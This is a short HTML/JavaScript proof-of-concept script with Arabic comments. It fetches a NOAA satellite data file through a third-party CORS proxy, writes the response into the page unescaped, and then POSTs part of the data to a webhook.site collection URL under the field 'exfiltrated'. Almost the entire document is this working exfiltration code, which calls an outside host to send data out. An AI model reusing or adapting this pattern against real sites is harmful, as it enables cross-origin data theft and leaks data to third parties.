<script>
const proxy = "https://nasa-cors-proxy-poc-vuc3.vercel.app/api/fetch";
const target = "https://data.goes.noaa.gov/data/pub/satellite_data.json"; // هدف يحتوي بيانات JSON
const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de"; // ضع رابطك الصحيح

console.log("🔍 PoC script started...");

fetch(`${proxy}?url=${encodeURIComponent(target)}`, { credentials: "omit" })
  .then(res => {
    console.log("✅ Received response:", res.status);
    return res.text();
  })
  .then(data => {
    console.log("📦 Data received:", data.slice(0, 200));
    document.body.innerHTML += `<pre>${data.slice(0, 500)}</pre>`;

    // محاولة إرسال البيانات إلى webhook
    fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        exfiltrated: data.slice(0, 1000),
        source: target
      })
    }).catch(e => {
      console.error("❌ Webhook POST failed:", e);
    });
  })
  .catch(e => {
    console.error("❌ Fetch failed:", e);
    document.body.innerHTML += `<p style="color:red;">❌ Error: ${e}</p>`;
  });
</script>
